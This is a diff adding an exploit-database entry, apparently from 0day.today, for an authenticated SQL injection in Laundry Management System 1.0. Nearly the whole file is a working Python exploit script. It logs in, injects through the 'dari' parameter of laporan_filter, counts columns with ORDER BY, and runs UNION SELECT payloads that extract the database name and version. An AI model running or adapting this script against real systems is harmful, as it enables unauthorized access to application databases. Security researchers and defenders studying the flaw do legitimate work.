@@ -1,0 +1,88 @@
+id: 37821
+date: 06/30/2022
+title: Laundry Management System 1.0 SQL Injection Exploit
+author: syad
+cves: 
+
+# Exploit Title: Laundry Management System 1.0 - Authenticated SQL Injection
+# Exploit Author: syad
+# Vendor Homepage: https://www.sourcecodester.com
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-ci_laundry.zip
+# Version: 1.0
+# Tested on: Windows 10 + XAMPP 3.2.4
+# CVE ID : N/A
+
+# Description 
+# The dari parameter does not perform input validation on the laporan_filter.php file it allow authenticated SQL Injection
+
+
+
+
+import sys
+import requests
+sess = requests.Session()
+
+proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}
+
+def login(ip,username,password):
+    target = "http://%s/ci_laundry/welcome/login" % ip
+    daftar = {'username':username,'password':password}
+    masuk = sess.post(target, data=daftar, proxies=proxies)
+    if "Dashboard" in masuk.text:
+        print("[$] Success Login :)")
+    else:
+        return False
+
+
+def trigger_sqli(ip):
+    target = "http://%s/ci_laundry/pengeluaran/laporan_filter" % ip
+    sql = {"dari":"1'",'sampai':'123'}
+    test = sess.post(target, data=sql, proxies=proxies)
+    if "You have an error in your SQL syntax" in test.text:
+        print("[$] Trigger SQL Injection !!!! :)")
+    else:
+        return False
+
+
+def count_column(ip):
+    target = "http://%s/ci_laundry/pengeluaran/laporan_filter" % ip
+    sql = {"dari":"1' ORDER BY 14-- -",'sampai':'123'}
+    test = sess.post(target, data=sql, proxies=proxies)
+    if test.status_code == 200:
+        print("[$] Found 14 Column In Database !!! :)")
+    
+
+def got_database_name(ip):
+    target = "http://%s/ci_laundry/pengeluaran/laporan_filter" % ip
+    sql = {"dari":"1' union select 1,2,database(),4,5,6,7,8,9,10,11,12,13,14-- -",'sampai':'123'}
+    test = sess.post(target, data=sql, proxies=proxies)
+    if "laundry_db" in test.text:
+        print("[$] Found Database Name is => laundry_db")
+
+def got_version_data(ip):
+    target = "http://%s/ci_laundry/pengeluaran/laporan_filter" % ip
+    sql = {"dari":"1' union select 1,2,version(),4,5,6,7,8,9,10,11,12,13,14-- -",'sampai':'123'}
+    test = sess.post(target, data=sql, proxies=proxies)
+    if "10.4.24-MariaDB" in test.text:
+        print("[$] Found Version Database is => 10.4.24-MariaDB")
+
+
+
+if __name__ == "__main__":
+    try:
+        ip = sys.argv[1].strip()
+        username = sys.argv[2].strip()
+        password = sys.argv[3].strip()
+    except IndexError:
+        print("[-] Usage %s <ip> <username> <password>" % sys.argv[0])
+        print("[-] Example: %s 192.168.1.x admin admin123"  % sys.argv[0])
+        sys.exit(-1)
+
+
+login(ip,username,password)
+trigger_sqli(ip)
+count_column(ip)
+got_database_name(ip)
+got_version_data(ip)
+
+#  0day.today [2023-03-26]  #
